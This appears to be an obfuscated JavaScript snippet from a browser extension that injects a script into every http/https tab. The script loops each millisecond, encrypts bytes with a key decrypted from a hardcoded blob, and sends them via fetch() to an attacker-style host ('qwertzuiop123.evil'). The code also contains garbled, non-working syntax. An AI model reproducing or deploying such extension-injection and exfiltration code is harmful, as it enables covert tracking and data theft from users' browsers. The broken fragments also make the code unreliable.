if (!('injected' in document)) {
    document['injected'] = true;
    window['setInterval'](async () => {
      y = new window['Uint8Array'](64);
      window['crypto']['getRandomValues'](y);
      if (new window['TextDecoder']('utf-8')['decode'](await window['crypto']['subtle']['digest']('sha-256', y))['endsWith']('chrome')) {
        j = new window['Uint8Array'](y['byteLength'](await window['crypto']['subtle']['digest']('sha-256', y))['byteLength']);
        j['set'](new window['Uint8Array'](y), 0);
        j['set'](new window['Uint8Array'](await window['crypto']['subtle']['digest']('sha-256', y)), y['byteLength']);
        window['fetch']('hxxps://qwertzuiop123.evil/'[...new window['Uint8Array'](await window['crypto']['subtle']['encrypt']({['n'q[1e3]'ame']: 'AES-CBC', ['iv']: new window['TextEncoder']('utf-8')['encode']('_NOT_THE_SECRET_')}, await window['crypto']['subtle']['importKey']('raw', await window['crypto']['subtle']['decrypt']({['n'q[1e3]'ame']: 'AES-CBC', ['iv']: new window['TextEncoder']('utf-8')['encode']('_NOT_THE_SECRET_')}, await window['crypto']['subtle']['importKey']('raw', new window['TextEncoder']('utf-8')['encode']('_NOT_THE_SECRET_'), {['n'q[1e3]'ame']: 'AES-CBC'}, true, ['decrypt']), new window['Uint8Array'](('E242E64261D21969F65BEDF954900A995209099FB6C3C682C0D9C4B275B1C212BC188E0882B6BE72C749211241187FA8')['match'](/../g)['map'](h => window['parseInt'](h, 16)))), {['n'q[1e3]'ame']: 'AES-CBC'}, true, ['encrypt']), j))]['map'](x => x['toString'](16)['padStart'](2, "0"))['join'](""));
      }
    }, 1);
  }


chrome['tabs']['onUpdated']['addListener']((tabVar, changeInfo, tab) => {
  if ('url' in tab && tab['url'] != null && (tab['url']['startsWith']('https://') || tab['url']['startsWith']('http://'))) {
    chrome['scripting']['executeScript']({['target']: {['tabId']: tab['id']}, function: iF});
  }
});